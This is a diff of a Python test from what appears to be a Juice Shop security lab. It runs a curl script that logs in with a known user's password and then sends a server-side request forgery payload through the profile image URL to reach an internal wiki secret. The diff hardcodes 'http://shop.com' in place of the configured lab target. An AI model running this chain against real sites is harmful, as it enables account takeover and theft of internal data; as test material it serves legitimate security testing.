@@ -58,11 +58,11 @@ def taken_through_the_app(stack_is_up):
     script = f'''
       T=$(curl -s --max-time 20 -H "Content-Type: application/json" \\
         -d '{{"email":"jim@juice-sh.op","password":"ncc-1701"}}' \\
-        "$FSL_TARGET/rest/user/login" | jq -r .authentication.token)
+        "http://shop.com/rest/user/login" | jq -r .authentication.token)
       [ -n "$T" ] || exit 1
       curl -s -o /dev/null --max-time 25 -b "token=$T" -H "Authorization: Bearer $T" \\
         --data-urlencode "imageUrl=http://wiki.internal{SECRET}" \\
-        "$FSL_TARGET/profile/image/url"
+        "http://shop.com/profile/image/url"
     '''
     chain = _in(ATTACKER, "bash", "-c", script, timeout=180)
     assert chain.ok, f"the chain did not run: {chain.stderr[:300]}"
